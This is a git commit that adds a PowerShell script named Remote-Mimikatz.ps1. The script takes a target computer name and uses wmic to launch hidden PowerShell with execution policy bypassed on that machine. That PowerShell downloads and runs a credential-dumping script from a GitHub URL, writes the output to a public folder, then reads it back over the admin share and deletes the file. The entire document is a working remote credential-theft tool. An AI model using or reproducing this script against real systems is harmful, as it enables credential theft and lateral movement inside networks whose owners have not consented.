fdb932fa59bd7c53e299730f40347049cb817efa
Joseph Ker <josephker@thebatcomputer.com>
2018-03-20 13:10:59 -0400

    Added Remote-Mimikatz.ps1

---
+++ Powershell/Remote-Mimikatz.ps1
@@ -0,0 +1,23 @@
+﻿$computer =  Read-host -Prompt 'Enter Computer Name'  
+$IP = [System.Net.Dns]::GetHostAddresses($computer).IPaddresstostring[0]
+$website = 'https://raw.githubusercontent.com/JosephKer/puddin/master/Powershell/Invoke-Kittenmittens.ps1'
+$command = 'wmic /node:' + $IP + ' ' +'process call create "powershell.exe -exec bypass -NoP -Noni -Win hidden IEX (New-Object Net.WebClient).DownloadString('+ "'"  + $website + "'" +')|Out-file C:\\Users\\public\\a.txt"'
+
+try {
+IEX $command -ErrorAction stop
+} catch {
+Write-host 'wmic did not run'
+}
+write-host 'Running please wait'
+sleep 15
+try{
+Get-Content \\$computer\c$\users\public\a.txt
+} catch {
+Write-Host 'File not Found'
+}
+try {
+Remove-Item \\$computer\c$\users\public\a.txt -ErrorAction Stop
+} catch {
+Write-Host 'No file to delete'
+}
+pause
